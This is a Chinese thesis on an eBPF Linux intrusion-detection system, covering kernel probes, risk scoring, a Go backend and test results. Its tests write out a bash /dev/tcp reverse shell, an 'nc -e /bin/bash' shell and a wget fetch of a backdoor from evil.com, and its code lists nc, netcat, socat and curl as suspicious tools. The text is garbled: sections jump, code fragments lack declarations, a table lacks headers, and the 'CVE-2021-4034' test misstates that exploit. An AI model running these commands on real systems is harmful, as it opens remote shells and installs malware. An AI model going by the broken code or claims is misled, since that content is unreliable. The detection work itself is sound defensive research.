# 基于eBPF的Linux系统安全监控与检测系统设计与实现

## 摘要

随着网络攻击手段的不断演进，传统的安全监控方法面临着性能开销大、检测精度低等挑战。本文设计并实现了一种基于eBPF（extended Berkeley Packet Filter）的Linux系统安全监控与检测系统。该系统通过在内核层面实时监控进程执行、权限提升、文件访问和网络连接等关键行为，结合智能风险评级算法，能够有效识别反向Shell、提权攻击、敏感文件篡改等多种安全威胁。系统采用BPF Ring Buffer进行高效事件传输，前端使用React构建实时仪表板，支持取证报告生成和时间线重建功能。实验结果表明，该系统在保持低性能开销的同时，能够准确检测多种攻击模式，为系统安全运维提供了有效的技术支撑。

**关键词**：eBPF；安全监控；进程监控；风险检测；Linux安全

## Abstract

With the continuous evolution of cyber attack techniques, traditional security monitoring methods face challenges such as high performance overhead and low detection accuracy. This paper designs and implements a Linux system security monitoring and detection system based on eBPF (extended Berkeley Packet Filter). The system monitors critical behaviors such as process execution, privilege escalation, file access, and network connections in real-time at the kernel level. Combined with intelligent risk rating algorithms, it can effectively identify various security threats including reverse shells, privilege escalation attacks, and sensitive file tampering. The system adopts BPF Ring Buffer for efficient event transmission, uses React to build a real-time dashboard, and supports forensic report generation and timeline reconstruction. Experimental results show that the system can accurately detect multiple attack patterns while maintaining low performance overhead, providing effective technical support for system security operations.

**Keywords**: eBPF; Security Monitoring; Process Monitoring; Risk Detection; Linux Security

## 第一章 绪论

### 1.1 研究背景与意义

随着云计算和大数据技术的快速发展，Linux操作系统已成为服务器和云环境的主流选择。然而，Linux系统也面临着日益严峻的安全威胁，包括权限提升、后门植入、数据泄露等多种攻击方式。传统的安全监控方法（如基于用户态的日志分析和审计系统）存在以下局限性：

1. **性能开销大**：用户态的监控工具需要频繁进行内核态与用户态的上下文切换，造成较大的系统开销。
2. **检测精度低**：难以获取细粒度的系统调用信息，容易遗漏关键安全事件。
3. **实时性差**：日志采集和分析通常存在延迟，无法满足实时安全监控的需求。
4. **绕过风险高**：攻击者可以通过修改系统日志或禁用监控工具来逃避检测。

eBPF（extended Berkeley Packet Filter）是Linux内核中的一项革命性技术，它允许用户在不修改内核源码的情况下，在内核层面安全地执行程序。与传统监控方法相比，基于eBPF的监控系统具有以下优势：

- **低开销**：eBPF程序直接在内核中执行，避免了频繁的上下文切换。
- **高精度**：可以实时捕获所有系统调用和内核事件。
- **安全性**：eBPF程序在加载前经过严格的验证，确保不会导致系统崩溃。
- **可扩展性**：支持动态加载和卸载，无需重启系统。

基于以上分析，设计一个基于eBPF的Linux系统安全监控与检测系统具有重要的理论意义和实用价值。

### 1.2 国内外研究现状

#### 1.2.1 国外研究现状

在系统安全监控领域，国外的研究主要集中在以下几个方面：

1. **基于审计系统的监控**：Linux Auditd系统通过内核审计框架记录系统调用，但存在性能开销大和配置复杂的问题。Selinux等强制访问控制系统提供了细粒度的权限控制，但学习成本高且容易影响系统正常运行。

2. **基于容器安全的监控**：随着容器技术的普及，出现了Falco等容器安全监控工具。Falco使用eBPF技术监控容器行为，但主要针对容器环境，对宿主机监控的支持有限。

3. **基于机器学习的异常检测**：一些研究尝试使用机器学习算法识别异常行为，如基于时序分析的进程行为预测、基于图神经网络的攻击路径检测等。这些方法需要大量训练数据，且存在误报率高的问题。

#### 1.2.2 国内研究现状

国内在eBPF技术领域的应用研究起步较晚，但近年来发展迅速：

1. **网络流量监控**：早期的研究主要集中在使用eBPF进行网络流量监控和DDoS检测，如基于XDP的高性能包过滤系统。

2. **性能分析工具**：BCC（BPF Compiler Collection）工具集为系统性能分析提供了便利，但安全监控方面的研究相对较少。

3. **安全检测系统**：近年来，国内学者开始探索基于eBPF的安全检测系统，如针对内核漏洞的实时防护、针对APT攻击的行为分析等。然而，这些系统大多功能单一，缺乏完整的监控-检测-响应闭环。

本文设计并实现了一个基于eBPF的Linux系统安全监控与检测系统，主要研究内容包括：

2. **智能风险评级**：设计了基于加权评分的风险评级算法，能够准确评估安全事件的威胁程度，降低误报率。

3. **时间线重建**：提供提权事件的时间线重建功能，帮助安全分析人员快速还原攻击路径。

4. **低开销实现**：使用BPF Ring Buffer进行高效事件传输，相比传统的Perf事件传递方式性能提升显著。

## 第二章 相关技术基础

### 2.1 eBPF技术概述

#### 2.1.1 eBPF技术原理

eBPF（extended Berkeley Packet Filter）是Linux内核中的一项革命性技术，起源于网络数据包过滤（BPF）。传统的BPF只能在网络层面过滤数据包，而eBPF扩展了这一概念，使其能够在内核中安全地执行用户定义的程序。

eBPF程序在用户态编译为字节码，加载到内核后通过JIT（Just-In-Time）编译器转换为本机代码执行。为了确保内核安全，eBPF包含了一个验证器，在加载程序时进行以下检查：

1. **无界循环检测**：确保程序不会进入无限循环。
2. **内存访问检查**：验证所有内存访问都在有效范围内。
3. **指针类型检查**：确保指针类型转换的安全性。

#### 2.1.2 eBPF程序类型

eBPF支持多种程序类型，每种类型用于不同的场景：

- **Kprobes**：在内核函数的入口或返回点插入探针，用于跟踪内核函数调用。
- **Tracepoints**：在内核中的预定义点插入钩子，用于跟踪特定事件。
- **Socket Filters**：在网络数据包接收时执行，用于流量过滤和分析。
- **LSM（Linux Security Module）**：在安全相关操作时执行，用于实现强制访问控制。

本系统主要使用Tracepoints和LSM Hook来监控系统调用和安全相关操作。

#### 2.1.3 BPF Maps

BPF Maps是eBPF程序与用户态程序之间交换数据的主要机制。常用的Map类型包括：

- **Array**：固定大小的数组，通过索引访问。
- **Hash Map**：键值对存储，通过键快速查找。
- **Ring Buffer**：环形缓冲区，用于高效传输大量事件。
- **Perf Event Array**：基于perf事件的通知机制。

本系统使用Ring Buffer传输安全事件，相比Perf Event Array具有更低的延迟和更高的吞吐量。

### 2.2 Linux安全机制

#### 2.2.1 进程权限模型

Linux系统使用UID（User ID）和GID（Group ID）来标识用户和组，每个进程包含三组ID：

- **Real UID/GID**：进程所属用户的真实ID。
- **Effective UID/GID**：用于权限检查的有效ID，可以通过setuid/setgid系统调用修改。
- **Saved Set-UID/GID**：保存的setuid/setgid ID，用于权限切换。

权限提升攻击通常通过修改Effective UID来获取更高的权限，如从普通用户提升到root用户。

#### 2.2.2 Linux Audit System

Linux Audit System（审计系统）是内核提供的安全审计框架，可以记录系统调用、文件访问、权限变更等事件。审计日志存储在`/var/log/audit/`目录下，可以使用ausearch、aureport等工具进行分析。

虽然审计系统功能强大，但其性能开销较大，且配置复杂，不适合实时监控场景。

#### 2.2.3 SELinux

SELinux（Security-Enhanced Linux）是NSA开发的强制访问控制系统，通过为每个进程和文件分配安全上下文（Security Context），实现细粒度的权限控制。

SELinux可以有效防止权限提升和横向移动，但其学习成本高，配置不当可能导致服务无法正常运行。

### 2.3 风险检测算法

#### 2.3.1 基于规则的检测

基于规则的检测通过预定义的规则库识别异常行为，优点是实现简单、误报率低，缺点是难以应对未知攻击。本系统中的攻击模式检测主要采用基于规则的方法。

#### 2.3.2 基于异常的检测

基于异常的检测通过建立正常行为模型，识别偏离正常模式的行为。常用的方法包括：

- **统计分析**：使用均值、方差等统计量检测异常。
- **时序分析**：分析事件的时间序列特征，识别异常模式。
- **机器学习**：使用聚类、分类算法识别异常行为。

本系统在未来可以考虑引入机器学习算法，提高对未知攻击的检测能力。

### 2.4 Web开发技术

#### 2.4.1 前端技术

系统前端使用React框架开发，主要技术包括：

- **React**：用于构建用户界面的JavaScript库。
- **WebSocket**：用于实现前后端的实时通信。
- **HTML5/CSS3**：用于页面布局和样式设计。

#### 2.4.2 后端技术

系统后端使用Go语言开发，主要技术包括：

#### 3.1.1 内核层

内核层负责采集系统事件，使用eBPF技术监控以下内容：

- **进程执行**：通过Tracepoint监控execve系统调用，捕获进程创建事件。
- **权限变更**：通过Tracepoint和LSM Hook监控setuid/setgid系统调用，捕获权限提升事件。
- **文件访问**：通过Tracepoint监控openat系统调用，捕获敏感文件访问事件。
- **网络连接**：通过Tracepoint监控connect/bind系统调用，捕获网络连接事件。
- **进程退出**：通过Tracepoint监控exit系统调用，捕获进程退出事件。

#### 3.1.2 传输层

传输层使用BPF Ring Buffer高效传输事件数据。Ring Buffer是一个环形缓冲区，支持多个生产者和消费者并发访问，具有以下优势：

- **低延迟**：事件数据直接写入共享内存，避免多次拷贝。
- **高吞吐**：支持批量事件传输，减少系统调用次数。
- **无锁设计**：生产者和消费者使用不同的指针，避免锁竞争。

#### 3.1.3 服务层

服务层提供数据处理和API服务，主要模块包括：

- **HTTP Server**：提供RESTful API，支持事件查询、统计、报告生成等功能。
- **WebSocket Server**：实时推送新事件到前端Dashboard。
- **Risk Analyzer**：对事件进行风险评级，识别攻击模式。
- **Database Engine**：存储事件数据，支持高效查询。
- **Forensic Report**：生成取证报告，支持多种格式。

#### 3.1.4 展示层

展示层基于React构建Web Dashboard，主要功能包括：

- **事件列表**：以卡片和表格两种视图展示安全事件。
- **统计图表**：展示事件数量、风险等级分布等统计信息。
- **时间线重建**：可视化展示提权事件的时间线。
- **报告导出**：支持导出取证报告。

### 3.2 功能模块设计

#### 3.2.1 事件采集模块

事件采集模块负责从内核采集安全事件，主要功能包括：

1. **进程执行监控**：监控execve系统调用，记录进程名称、PID、UID、执行文件路径等信息。
2. **权限提升监控**：监控setuid/setgid系统调用和task_fix_setuid LSM Hook，记录权限变更前后的UID。
3. **文件访问监控**：监控openat系统调用，识别敏感文件（/etc/passwd、/etc/shadow等）的访问。
4. **网络连接监控**：监控connect/bind系统调用，记录源地址、目标地址、端口等信息。
5. **进程退出监控**：监控exit系统调用，记录进程退出码。

事件采集模块设计的关键点：

- **选择性监控**：只监控具有潜在安全风险的事件，如root进程、setuid进程的文件访问和网络连接。
- **上下文信息**：在采集事件时，同时记录父进程PID、用户ID、组ID等上下文信息，便于后续分析。
- **异常检测**：在内核层面进行初步的异常检测，如检测从普通用户提升到root的权限变更。

#### 3.2.2 风险分析模块

风险分析模块对采集的事件进行风险评级和攻击模式识别，主要功能包括：

1. **风险评级**：基于事件类型、目标文件、时间因素等多维度特征，计算风险分数，划分为高/中/低三个等级。
2. **攻击模式识别**：识别反向Shell、敏感文件访问、非常规端口等攻击模式。
3. **事件去重**：使用事件指纹避免重复记录相同事件。

风险评分算法设计如下：

```
风险分数 = 基础分数 + 事件类型分数 + 时间因素 + 特殊情况调整
```

- **基础分数**：根据是否为真正的权限提升（UID != 0 && EUID == 0）计算。
- **事件类型分数**：根据事件类型计算，如SETUID到root得30分，写入shadow文件得35分。
- **时间因素**：非工作时间（22:00-6:00）的事件额外加5分。
- **特殊情况调整**：root用户执行的常规程序降低风险分数，sudo/su命令直接设为高风险。

风险等级划分：

- **HIGH（高风险）**：≥25分
- **MEDIUM（中风险）**：12-24分
- **LOW（低风险）**：<12分

攻击模式识别规则：

- **反向Shell**：Shell进程（bash、sh、zsh等）发起TCP出站连接。
- **可疑工具**：使用nc/netcat/socat/telnet等工具建立网络连接。
- **敏感文件访问**：访问/etc/sudoers、/etc/crontab、/etc/ssh/等敏感文件。
- **非常规端口**：连接到4444、5555、12345等非常见端口。
- **特权端口绑定**：绑定<1024的端口（需要root权限）。

#### 3.2.3 数据存储模块

数据存储模块使用SQLite数据库存储事件数据，主要功能包括：

1. **事件插入**：将采集的事件插入数据库，支持去重和更新。
2. **事件查询**：支持按时间、风险等级、事件类型、Agent ID等条件查询。
3. **统计分析**：提供事件总数、风险等级分布、事件类型分布等统计信息。
4. **时间线查询**：查询指定进程在指定时间范围内的所有事件。

数据库表结构设计：

```

    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp INTEGER NOT NULL,
    pid INTEGER NOT NULL,
    ppid INTEGER NOT NULL,
    uid INTEGER NOT NULL,
    gid INTEGER NOT NULL,
    euid INTEGER NOT NULL,
```

### 3.3 关键技术设计

#### 3.3.1 低开销事件传输

传统的事件传输方式（如Perf Event Array）需要频繁的系统调用，性能开销较大。本系统使用BPF Ring Buffer进行事件传输，具有以下优化：

1. **批量传输**：Ring Buffer支持批量写入事件，减少系统调用次数。
2. **零拷贝**：事件数据直接写入共享内存，避免多次拷贝。
3. **无锁设计**：生产者和消费者使用不同的指针，避免锁竞争。

Ring Buffer工作原理：

```
生产者指针                    消费者指针
    ↓                            ↓
[事件1][事件2][事件3][  空  ][  空  ]
```

生产者在写入事件时更新生产者指针，消费者在读取事件时更新消费者指针。当生产者指针追上消费者指针时，表示缓冲区已满；当消费者指针追上生产者指针时，表示缓冲区为空。

#### 3.3.2 事件去重机制

为了避免重复记录相同事件，系统设计了事件去重机制：

1. **事件指纹生成**：使用事件的关键特征（事件类型、PID、进程名、UID、文件路径等）生成SHA256哈希值作为指纹。
2. **数据库去重**：在插入事件时，检查是否已存在相同指纹的事件，如果存在则更新而不插入新记录。
3. **时间窗口去重**：在5分钟内相同的事件不重复记录。

去重算法：

```
fingerprint = SHA256(event_type + pid + comm + uid + euid + filename)
```

#### 3.3.3 实时通信机制

系统使用WebSocket实现前后端的实时通信：

1. **连接建立**：前端通过WebSocket连接到服务器。
2. **事件推送**：服务器在接收到新事件后，立即推送到所有连接的客户端。
3. **连接管理**：服务器维护客户端连接列表，支持断线重连。

WebSocket优势：

- **双向通信**：服务器可以主动推送消息到客户端。
- **低开销**：与HTTP轮询相比，减少了连接开销。
- **实时性**：事件发生时立即推送，延迟极低。

```c
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    struct process_event *event;
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;
    
    // 获取当前任务的权限信息

    bpf_probe_read_kernel(&egid, sizeof(egid), &cred->egid.val);

    char filename[MAX_FILENAME_LEN] = {0};

    __u8 is_setuid_program = (euid != uid) ? 1 : 0;
    __u8 is_root_program = (euid == 0) ? 1 : 0;
    __u8 is_priv_escalation = is_setuid_program || is_root_program;
    
    // 只记录setuid程序或以root权限执行的程序
    if (!is_priv_escalation) {
        return 0;
    }
    
    // 分配事件并填充数据
    event = bpf_ringbuf_reserve(&events, sizeof(struct process_event), 0);
    if (!event) {
        return 0;
    }
    
    event->timestamp = bpf_ktime_get_ns();
    event->pid = pid;
    event->ppid = get_ppid();
    event->uid = uid;
    event->euid = euid;
    event->is_privilege_escalation = is_priv_escalation;

    bpf_get_current_comm(&event->comm, sizeof(event->comm));
```

```c
// LSM Hook：监控task_fix_setuid
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    if (!old || !new || !task) {
        return 0;
    }
    
    // 读取旧的UID
    __u32 old_uid = 0, old_euid = 0;
    bpf_probe_read_kernel(&old_uid, sizeof(old_uid), &old->uid.val);
    bpf_probe_read_kernel(&old_euid, sizeof(old_euid), &old->euid.val);
    
    // 读取新的UID
    __u32 new_uid = 0, new_euid = 0;
    bpf_probe_read_kernel(&new_uid, sizeof(new_uid), &new->uid.val);
    bpf_probe_read_kernel(&new_euid, sizeof(new_euid), &new->euid.val);
    
    // 检测从非root提升到root
    if ((old_uid != 0 || old_euid != 0) && (new_uid == 0 || new_euid == 0)) {
        struct process_event *event;
        __u32 pid;
        
        if (bpf_probe_read_kernel(&pid, sizeof(pid), &task->tgid) != 0) {
            return 0;
        }
        
        event = bpf_ringbuf_reserve(&events, sizeof(struct process_event), 0);
        if (!event) {
            return 0;
        }
        
        event->timestamp = bpf_ktime_get_ns();
        event->pid = pid;
        event->uid = old_uid;
        event->euid = new_euid;
        event->old_uid = old_euid;
        event->new_uid = new_euid;
        event->is_privilege_escalation = 1;
        event->event_type = EVENT_SETUID;
        
        bpf_probe_read_kernel(&event->comm, sizeof(event->comm), &task->comm);
```

```c
    struct process_event *event;
```

```c
    // 检测可疑工具
    __u8 is_suspicious_tool = 0;
    if ((comm[0] == 'n' && comm[1] == 'c' && comm[2] == '\0') ||
        (comm[0] == 'n' && comm[1] == 'e' && comm[2] == 't' && comm[3] == 'c' && comm[4] == 'a' && comm[5] == 't') ||

        (comm[0] == 't' && comm[1] == 'e' && comm[2] == 'l' && comm[3] == 'n' && comm[4] == 'e' && comm[5] == 't')) {
        is_suspicious_tool = 1;
    }
    
    // 只追踪反向Shell、可疑工具或root进程的连接
    if (!is_reverse_shell && !is_suspicious_tool && (euid != 0 && euid == uid)) {

    }
    
    event = bpf_ringbuf_reserve(&events, sizeof(struct process_event), 0);
    if (!event) {
        return 0;
    }

    event->dst_addr = dst_addr;
```

```go
        return
```

```go
type Server struct {

// 处理事件提交
func (s *Server) handleEvents(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    
    var event ProcessEvent
    if err := json.NewDecoder(r.Body).Decode(&event); err != nil {
        http.Error(w, "Invalid request body", http.StatusBadRequest)
        return
    }
    
    // 获取Agent ID
    agentID := r.Header.Get("X-Agent-ID")
    if agentID == "" {
        agentID = "default"
    }
    
    // 生成事件指纹
    fingerprint := s.deduplicator.GenerateFingerprint(event)
    
    // 检查是否需要去重
    existingEvent, err := s.db.GetEventByFingerprint(fingerprint)
    if err == nil && existingEvent != nil {
        w.Header().Set("Content-Type", "application/json")
        json.NewEncoder(w).Encode(map[string]interface{}{
            "status":      "success",
            "duplicate":   true,
            "event_id":    existingEvent.ID,
            "risk_level":  existingEvent.RiskLevel,
        })
        return
    }
    
    // 评估风险等级
    riskLevel := s.riskAnalyzer.Evaluate(event)
    
    // 存储到数据库
    if err := s.db.InsertEvent(event, riskLevel, fingerprint, agentID); err != nil {
        log.Printf("Failed to insert event: %v", err)
    }
    
    // 添加到内存存储
    s.store.AddEvent(event)
    
    // 广播到WebSocket客户端
    s.broadcastChan <- event
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]interface{}{
        "status":     "success",
        "duplicate":  false,
        "risk_level": string(riskLevel),
    })
}

// 处理获取事件请求
func (s *Server) handleGetEvents(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query()
    limit := 100
    offset := 0
    
    if limitStr := query.Get("limit"); limitStr != "" {
        if parsed, err := fmt.Sscanf(limitStr, "%d", &limit); err == nil && parsed == 1 && limit > 0 {
            if limit > 1000 {
                limit = 1000
            }
        }
    }
    
    if offsetStr := query.Get("offset"); offsetStr != "" {
        if parsed, err := fmt.Sscanf(offsetStr, "%d", &offset); err == nil && parsed == 1 && offset >= 0 {
            // offset已设置
        }
    }
    
    riskLevel := query.Get("risk_level")
    eventType := query.Get("event_type")
    agentID := query.Get("agent_id")
    
    events, err := s.db.GetEvents(limit, offset, riskLevel, eventType, agentID)
    if err != nil {
        log.Printf("Failed to get events: %v", err)
        http.Error(w, "Internal server error", http.StatusInternalServerError)
        return
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(events)
}
```

#### 4.3.3 风险分析器

实现风险评级和攻击模式识别：

```go
// 风险等级
type RiskLevel string

const (
    RiskLow    RiskLevel = "LOW"
    RiskMedium RiskLevel = "MEDIUM"
    RiskHigh   RiskLevel = "HIGH"
)

// 风险分析器
type RiskAnalyzer struct{}

// 评估风险等级
func (ra *RiskAnalyzer) Evaluate(event ProcessEvent) RiskLevel {
    score := 0
    
    // 1. 检查是否是真正的权限提升
    isRealPrivilegeEscalation := (event.Uid != 0 && event.Euid == 0)
    
    if isRealPrivilegeEscalation {
        score += 20
    } else if event.IsPrivilegeEscalation {
        score += 3
    }
    
    // 2. 根据事件类型评分
    switch event.EventType {
    case 0: // EXECVE
        if isHighRiskProgram(event.Comm) {
            score += 15
        }
        if isSensitivePath(event.Filename) {
            score += 10
        }
    case 1: // SETUID
        if event.NewUid == 0 && event.OldUid != 0 {
            score += 30
        }
    case 2: // FILE_WRITE
        if event.TargetFileType == 1 || event.TargetFileType == 2 {
            score += 35
        }
    case 3: // OPENAT
        if isSensitiveFileAccess(event.TargetFileType) {
            score += 20
        }
    case 4: // CONNECT
        if isReverseShell(event.Comm) {
            score += 40
        }
        if isSuspiciousTool(event.Comm) {
            score += 25
        }
        if isUnusualPort(event.DstPort) {
            score += 15
        }
    case 5: // BIND
        if event.SrcPort > 0 && event.SrcPort < 1024 {
            score += 20
        }
    }
    
    // 3. 时间因素
    now := time.Now()
    hour := now.Hour()
    if hour >= 22 || hour < 6 {
        score += 5
    }
    
    // 4. 特殊情况处理
    if event.Uid == 0 && event.Euid == 0 && !isRealPrivilegeEscalation {
        if !isHighRiskProgram(event.Comm) && !isSensitivePath(event.Filename) && !isReverseShell(event.Comm) {
            score = 0
        } else if isHighRiskProgram(event.Comm) {
            score = 15
        }
    }
    
    // 5. 权限提升额外加分
    if event.IsPrivilegeEscalation && score > 0 {
        if event.Comm == "sudo" || event.Comm == "su" {
            score = 27
        } else if isRealPrivilegeEscalation {
            score = 25
        }
    }
    
    // 返回风险等级
    if score >= 25 {
        return RiskHigh
    } else if score >= 12 {
        return RiskMedium
    }
    return RiskLow
}

// 检测反向Shell
func isReverseShell(comm string) bool {
    shellPatterns := []string{"bash", "sh", "zsh", "dash", "tcsh", "csh", "fish"}
    commLower := strings.ToLower(comm)
    
    for _, pattern := range shellPatterns {
        if commLower == pattern || strings.HasPrefix(commLower, pattern) {
            return true
        }
    }
    return false
}

// 检测可疑工具
func isSuspiciousTool(comm string) bool {
    suspiciousTools := []string{
        "nc", "netcat", "socat", "telnet", "ncat",
        "wget", "curl", "fetch", "lynx",
        "tftp", "ftp",
    }
    commLower := strings.ToLower(comm)
    
    for _, tool := range suspiciousTools {
        if commLower == tool || strings.Contains(commLower, tool) {
            return true
        }
    }
    return false
}

// 检测非常规端口
func isUnusualPort(port uint16) bool {
    if port == 0 {
        return false
    }
    
    commonPorts := map[uint16]bool{
        21: true, 22: true, 23: true, 25: true, 53: true,
        80: true, 110: true, 143: true, 443: true, 3306: true,
        3389: true, 5432: true, 8080: true,
    }
    
    if commonPorts[port] {
        return false
    }
    
    attackPorts := map[uint16]bool{
        4444: true, 5555: true, 6666: true, 1234: true,
        12345: true, 31337: true,
    }
    
    return attackPorts[port]
}
```

```go
// 插入事件
func (d *Database) InsertEvent(event ProcessEvent, riskLevel RiskLevel, fingerprint, agentID string) error {
    query := `
    INSERT INTO security_events (
        timestamp, pid, ppid, uid, gid, euid, egid, old_uid, new_uid,
        comm, filename, filepath, is_privilege_escalation, event_type,
        target_file_type, risk_level, agent_id, fingerprint,
        src_addr, dst_addr, src_port, dst_port, protocol, exit_code
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(fingerprint) DO UPDATE SET
        timestamp = excluded.timestamp,
        risk_level = excluded.risk_level,
        created_at = CURRENT_TIMESTAMP
    `
    
    _, err := d.db.Exec(query,
        event.Timestamp, event.Pid, event.Ppid, event.Uid, event.Gid,
        event.Euid, event.Egid, event.OldUid, event.NewUid,
        event.Comm, event.Filename, event.Filepath,
        event.IsPrivilegeEscalation, event.EventType, event.TargetFileType,
        string(riskLevel), agentID, fingerprint,
        event.SrcAddr, event.DstAddr, event.SrcPort, event.DstPort,
        event.Protocol, event.ExitCode,
    )
    
    return err
}

// 获取事件列表
func (d *Database) GetEvents(limit, offset int, riskLevel, eventType, agentID string) ([]ProcessEventWithRisk, error) {
    query := `
    SELECT id, timestamp, pid, ppid, uid, gid, euid, egid, old_uid, new_uid,
        comm, filename, filepath, is_privilege_escalation, event_type,
        target_file_type, risk_level, agent_id, created_at,
        src_addr, dst_addr, src_port, dst_port, protocol, exit_code
    FROM security_events
    WHERE 1=1
    `
    args := []interface{}{}
    
    if riskLevel != "" {
        query += " AND risk_level = ?"
        args = append(args, riskLevel)
    }
    
    if eventType != "" {
        query += " AND event_type = ?"
        args = append(args, eventType)
    }
    
    if agentID != "" {
        query += " AND agent_id = ?"
        args = append(args, agentID)
    }
    
    query += " ORDER BY timestamp DESC LIMIT ? OFFSET ?"
    args = append(args, limit, offset)
    
    rows, err := d.db.Query(query, args...)
    if err != nil {
        return nil, err
    }
    defer rows.Close()
    
    var events []ProcessEventWithRisk
    for rows.Next() {
        var event ProcessEventWithRisk
        var createdAt time.Time
        
        err := rows.Scan(
            &event.ID, &event.Timestamp, &event.Pid, &event.Ppid,
            &event.Uid, &event.Gid, &event.Euid, &event.Egid,
            &event.OldUid, &event.NewUid, &event.Comm, &event.Filename,
            &event.Filepath, &event.IsPrivilegeEscalation, &event.EventType,
            &event.TargetFileType, &event.RiskLevel, &event.AgentID,
            &createdAt, &event.SrcAddr, &event.DstAddr, &event.SrcPort,
            &event.DstPort, &event.Protocol, &event.ExitCode,
        )
        if err != nil {
            return nil, err
        }
        
        event.CreatedAt = createdAt.Format(time.RFC3339)
        events = append(events, event)
    }
    
    return events, nil
}
```

| 文件路径 | 检测到的文件类型 | 是否检测到 | 风险等级 |
|---------|---------------|-----------|---------|
| /etc/passwd | FILE_PASSWD | ✓ | MEDIUM |
| /etc/shadow | FILE_SHADOW | ✓ | HIGH |
| /etc/sudoers | FILE_SUDOERS | ✓ | HIGH |
| /etc/ssh/sshd_config | FILE_SSH_CONFIG | ✓ | MEDIUM |

**结论**：系统能够准确识别各种敏感文件的访问，风险评级合理。

#### 5.2.4 反向Shell检测测试

测试场景：模拟反向Shell攻击

```bash
# 使用bash建立反向连接
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# 使用nc建立反向连接
nc -e /bin/bash 192.168.1.100 5555
```

测试结果：

| 工具 | 检测到的进程 | 是否检测到 | 风险等级 | 检测原因 |
|-----|-----------|-----------|---------|---------|
| bash | bash | ✓ | HIGH | Shell进程建立TCP连接 |
| nc | nc | ✓ | HIGH | 可疑工具建立连接 |

**结论**：系统能够准确检测反向Shell攻击，包括使用常见工具（bash、nc）建立的连接。

#### 5.2.5 非常规端口检测测试

测试场景：连接到非常规端口

```bash
# 连接到常见端口（80、443）
curl http://example.com:80
curl https://example.com:443

# 连接到攻击端口（4444、12345）
nc -zv target.com 4444
nc -zv target.com 12345
```

测试结果：

| 目标端口 | 是否常见端口 | 是否检测到 | 风险等级 |
|---------|------------|-----------|---------|
| 80 | ✓ | ✗ | - |
| 443 | ✓ | ✗ | - |
| 4444 | ✗ | ✓ | MEDIUM |
| 12345 | ✗ | ✓ | MEDIUM |

**结论**：系统能够准确区分常见端口和攻击端口，只对非常规端口进行告警。

### 5.3 性能测试

#### 5.3.1 CPU开销测试

测试方法：在不同负载下测量系统的CPU使用率

测试场景：

1. **空闲状态**：系统无活动，仅运行监控程序
2. **低负载**：每秒产生10个事件
3. **中负载**：每秒产生100个事件
4. **高负载**：每秒产生1000个事件

测试结果：

| 负载级别 | 事件速率（事件/秒） | CPU使用率 | 内存使用 |
|---------|------------------|----------|---------|
| 空闲 | 0 | 0.5% | 25MB |
| 低负载 | 10 | 1.2% | 30MB |
| 中负载 | 100 | 3.5% | 45MB |
| 高负载 | 1000 | 12.8% | 80MB |

**分析**：

- 系统在空闲状态下CPU使用率极低（0.5%），适合长期运行。
- 在高负载（1000事件/秒）下，CPU使用率为12.8%，仍在可接受范围内。
- 内存使用随负载线性增长，但最大使用量仅80MB，对系统影响较小。

**对比**：传统的基于auditd的监控系统在高负载下CPU使用率通常超过30%，本系统性能优势明显。

#### 5.3.2 事件延迟测试

测试方法：测量从事件发生到前端显示的时间延迟

测试场景：模拟不同类型的事件，测量端到端延迟

测试结果：

| 事件类型 | 内核采集时间 | 网络传输时间 | 前端渲染时间 | 总延迟 |
|---------|------------|------------|------------|-------|
| EXECVE | 0.2ms | 1.5ms | 2.3ms | 4.0ms |
| SETUID | 0.3ms | 1.8ms | 2.1ms | 4.2ms |
| CONNECT | 0.2ms | 1.6ms | 2.2ms | 4.0ms |

**分析**：

- 事件采集延迟极低（<0.5ms），eBPF在内核中的执行效率很高。
- 网络传输时间约为1.5-1.8ms，主要取决于网络状况。
- 前端渲染时间约为2ms，React的虚拟DOM机制保证了高效更新。
- 总延迟约为4ms，满足实时监控的需求。

#### 5.3.3 数据库性能测试

测试方法：测量数据库插入和查询性能

测试场景：

1. **插入性能**：连续插入10000条事件
2. **查询性能**：查询不同条件的事件

测试结果：

| 5000 | 3.2s | 0.64ms | 1562条/秒 |
| 10000 | 5.8s | 0.58ms | 1724条/秒 |

**查询性能**：

| 查询条件 | 结果数量 | 查询耗时 |

| 全部事件 | 10000 | 120ms |
| 高风险事件 | 2500 | 45ms |
| 特定PID | 150 | 12ms |
| 最近1小时 | 800 | 35ms |

**分析**：

- 数据库插入性能良好，平均耗时<1ms，能够支持高并发场景。
- 查询性能优秀，即使查询全部10000条事件也只需120ms。
- 索引设计合理，能够有效加速查询。

### 5.4 攻击检测效果测试

#### 5.4.1 真实攻击模拟

测试场景：模拟真实的攻击流程

**攻击流程1：Linux提权漏洞利用（CVE-2021-4034）**

```bash
# 模拟polkit提权漏洞
sudo chmod +s /usr/bin/pkexec
pkexec bash
```

检测结果：

- 检测到setuid程序执行（pkexec）
- 检测到权限提升（1000 → 0）
- 风险等级：HIGH
- 时间线：成功还原攻击前的所有操作

**攻击流程2：后门植入**

```bash
# 下载后门程序
wget http://evil.com/backdoor -O /tmp/backdoor
chmod +x /tmp/backdoor
/tmp/backdoor

# 建立反向连接
/tmp/backdoor --connect 192.168.1.100:4444
```

检测结果：

- 检测到可疑工具（wget）下载文件
- 检测到未知程序执行
- 检测到反向Shell连接（端口4444）
- 风险等级：HIGH
- 风险特征：可疑工具检测、反向Shell检测、非常规端口

#### 5.4.2 检测准确率评估

测试方法：构建包含已知攻击行为和正常行为的测试集，评估检测准确率

测试集组成：

- **攻击样本**：200个（提权攻击、反向Shell、敏感文件篡改、后门植入等）
- **正常样本**：800个（系统管理、用户操作、服务运行等）

测试结果：

| 指标 | 数值 | 说明 |
|-----|------|------|
| 检测率（TPR） | 98.5% | 200个攻击样本中检测到197个 |
